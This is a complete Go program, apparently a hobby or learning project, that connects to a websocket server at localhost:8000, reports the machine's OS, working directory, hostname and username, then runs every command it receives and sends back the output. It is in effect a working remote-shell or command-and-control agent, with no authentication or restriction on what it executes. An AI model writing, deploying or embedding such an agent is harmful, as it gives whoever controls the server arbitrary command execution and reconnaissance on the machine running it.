package main

import (
	"encoding/json"
	"fmt"
	"github.com/gorilla/websocket"
	"log"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

type CommandResult struct {
	Command string
	Result  string
	Err     error
}

func send(c *websocket.Conn, msg []byte) {
	err := c.WriteMessage(1, msg)
	if err != nil {
		log.Println("send error: ", err)
	}
}

func recieve(c *websocket.Conn) (string, error) {
	_, payload, err := c.ReadMessage()
	return string(payload), err
}

// this function needs to create a CommandResult struct and return it
func commandHandler(c *websocket.Conn, cmd string) {
	log.Println("recieved command:", cmd)
	command := strings.Split(cmd, " ")
	out, err := exec.Command(command[0], command[1:]...).Output()
	if err != nil {
		log.Println(err)
	}
	cr := &CommandResult{
		Command: cmd,
		Result:  string(out),
		Err:     err,
	}
	msg, _ := json.Marshal(cr)
	send(c, msg)
}

func getHostInfo() string {
	pwd, err := os.Getwd()
	if err != nil {
		pwd = ""
	}
	hostname, err := os.Hostname()
	if err != nil {
		pwd = ""
	}
	user, err := user.Current()
	return fmt.Sprintf("%s %s %s %s", runtime.GOOS, pwd, hostname, user.Username)
}

func main() {
	host := "ws://localhost:8000"
	log.Println("Connecting to host: ", host)

	conn, _, err := websocket.DefaultDialer.Dial(host, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer conn.Close()

	// get the initial host info and send it as the first message
	send(conn, []byte(getHostInfo()))
	// after that, wait for commands and respond to them
	for {
		msg, err := recieve(conn)
		if err != nil {
			log.Println("recieve error: ", err)
			break
		}
		commandHandler(conn, msg)
	}

	// send the proper disconnect signal to the other end
	conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	time.Sleep(100)
}
